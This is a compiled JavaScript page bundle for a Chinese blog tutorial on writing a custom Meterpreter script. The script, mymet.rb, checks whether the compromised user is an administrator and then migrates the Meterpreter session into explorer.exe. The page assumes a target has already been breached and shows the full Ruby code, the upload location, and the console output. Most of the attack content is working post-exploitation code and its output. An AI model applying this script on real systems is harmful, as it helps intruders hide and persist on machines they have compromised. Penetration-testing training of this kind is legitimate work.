(window.webpackJsonp=window.webpackJsonp||[]).push([[349],{645:function(e,s,n){"use strict";n.r(s);var r=n(7),a=Object(r.a)({},(function(){var e=this,s=e._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[s("h1",{attrs:{id:"metasploit制作并运行自定义meterpreper脚本"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#metasploit制作并运行自定义meterpreper脚本"}},[e._v("#")]),e._v(" Metasploit制作并运行自定义Meterpreper脚本")]),e._v(" "),s("p",[e._v("注意：运行此脚本的前提是我们已经经过一系列的渗透，成功拿下了Meterpreter命令行。")]),e._v(" "),s("p",[e._v("这个脚本将会检查我们当前用户是否为管理员用户，然后找到explorer.exe进程，并自动迁移到这个进程中。")]),e._v(" "),s("p",[e._v("具体脚本mymet.rb如下：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v('##\n# Author 冰河\n# Date 2019-01-14\n# Description Meterpreter脚本实例，检查 我们当前是否为管理员用户，然后找到exeplorer进程，并自动迁移到这个进程中\n##\nadmin_check=is_admin?\nif(admin_check)\n  print_good("Current User Is Admin")\nelse\n  print_error("Current User Is Not Admin")\nend\n\nsession.sys.process.get_processes().each do |x|\n  if x[\'name\'].downcase == "explorer.exe"\n    print_good("Explorer.exe Process is Running with PID #{x[\'pid\']}")\n    explorer_ppid = x[\'pid\'].to_i\n    print_good("Migrating to Exeplorer.exe at PID #{explorer_ppid.to_s}")\n    session.core.migrate(explorer_ppid)\n  end\nend\n')])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br"),s("span",{staticClass:"line-number"},[e._v("4")]),s("br"),s("span",{staticClass:"line-number"},[e._v("5")]),s("br"),s("span",{staticClass:"line-number"},[e._v("6")]),s("br"),s("span",{staticClass:"line-number"},[e._v("7")]),s("br"),s("span",{staticClass:"line-number"},[e._v("8")]),s("br"),s("span",{staticClass:"line-number"},[e._v("9")]),s("br"),s("span",{staticClass:"line-number"},[e._v("10")]),s("br"),s("span",{staticClass:"line-number"},[e._v("11")]),s("br"),s("span",{staticClass:"line-number"},[e._v("12")]),s("br"),s("span",{staticClass:"line-number"},[e._v("13")]),s("br"),s("span",{staticClass:"line-number"},[e._v("14")]),s("br"),s("span",{staticClass:"line-number"},[e._v("15")]),s("br"),s("span",{staticClass:"line-number"},[e._v("16")]),s("br"),s("span",{staticClass:"line-number"},[e._v("17")]),s("br"),s("span",{staticClass:"line-number"},[e._v("18")]),s("br"),s("span",{staticClass:"line-number"},[e._v("19")]),s("br"),s("span",{staticClass:"line-number"},[e._v("20")]),s("br")])]),s("p",[e._v("接下来，我们将脚本mymet.rb上传到Kali的/usr/share/metasploit-framework/scripts/meterpreter目录下。")]),e._v(" "),s("p",[e._v("首先，我们现在Meterpreter上执行如下命令：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("meterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > \nmeterpreter > getpid\nCurrent pid: 684\nmeterpreter > ps\n\nProcess List\n============\n\n PID   PPID  Name               Arch  Session  User                          Path\n ---   ----  ----               ----  -------  ----                          ----\n2208  2168  explorer.exe       x64   1        liuyazhuang-PC\\liuyazhuang    C:\\Windows\\explorer.exe\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br"),s("span",{staticClass:"line-number"},[e._v("4")]),s("br"),s("span",{staticClass:"line-number"},[e._v("5")]),s("br"),s("span",{staticClass:"line-number"},[e._v("6")]),s("br"),s("span",{staticClass:"line-number"},[e._v("7")]),s("br"),s("span",{staticClass:"line-number"},[e._v("8")]),s("br"),s("span",{staticClass:"line-number"},[e._v("9")]),s("br"),s("span",{staticClass:"line-number"},[e._v("10")]),s("br"),s("span",{staticClass:"line-number"},[e._v("11")]),s("br"),s("span",{staticClass:"line-number"},[e._v("12")]),s("br"),s("span",{staticClass:"line-number"},[e._v("13")]),s("br")])]),s("p",[e._v("可以看到当前的用户是管理员权限，当前session绑定的进程ID是684，explorer进程ID为2208")]),e._v(" "),s("p",[e._v("接下来我们在Meterpreter命令行下运行如下命令：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("run myset\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[e._v("输出如下：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("meterpreter > run mymet \n[+] Current User Is Admin\n[+] Explorer.exe Process is Running with PID 2208\n[+] Migrating to Exeplorer.exe at PID 2208\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br"),s("span",{staticClass:"line-number"},[e._v("4")]),s("br")])]),s("p",[e._v("如下：")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190115160713658.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("可以看到，命令成功运行")]),e._v(" "),s("p",[e._v("此时我们再次查看当前session绑定的PID")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("meterpreter > getpid\nCurrent pid: 2208\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br")])]),s("p",[e._v("可以看到当前session已经绑定到explorer.exe进程了。")]),e._v(" "),s("h2",{attrs:{id:"写在最后"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[e._v("#")]),e._v(" 写在最后")]),e._v(" "),s("blockquote",[s("p",[e._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),s("strong",[e._v("冰河技术")]),e._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),s("strong",[e._v("冰河技术")]),e._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),s("strong",[e._v("冰河技术")]),e._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),s("strong",[e._v("冰河技术")]),e._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);s.default=a.exports}}]);